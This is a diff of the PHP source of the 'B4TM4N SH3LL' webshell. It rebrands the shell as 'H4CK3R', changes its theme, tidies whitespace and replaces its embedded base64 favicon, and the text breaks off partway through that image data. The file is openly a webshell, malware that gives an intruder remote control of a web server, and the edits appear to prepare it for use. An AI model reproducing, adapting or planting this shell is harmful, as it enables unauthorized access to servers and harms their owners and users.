@@ -1,6 +1,6 @@
 <?php
 
-/* 
+/*
  * B4TM4N SH3LL is PHP WEBSHELL
  *
  * Features:
@@ -31,9 +31,9 @@ $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
  */
 
 $config=array(
-	"title"     => "B4TM4N SH3LL",                 // Your Title
-	"subtitle"  => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
-	"themes"    => "br34k",                        // Your Themes (D4RK or BR34K)
+	"title"     => "H4CK3R",                 // Your Title
+	"subtitle"  => "V3RS10N 2.7",        // Your Subtitle
+	"themes"    => "d4rk",                        // Your Themes (D4RK or BR34K)
 	"debug"     => false                           // Debug Mode
 );
 
@@ -227,7 +227,7 @@ if(!strpos(strval(ini_get('disable_functions')),'set_time_limit'))
 }
 
 // Debug Settings
-if($config['debug']==true) 
+if($config['debug']==true)
 {
 	set_error_handler('error'); // Error Handler
 	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@@ -257,12 +257,12 @@ $start=microtime(true);                    // Time Pageload
 <?=$title?>
 </title>
 <meta name='author' content='k4mpr3t'/>
-<link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
+<link href="data:image/png;base64,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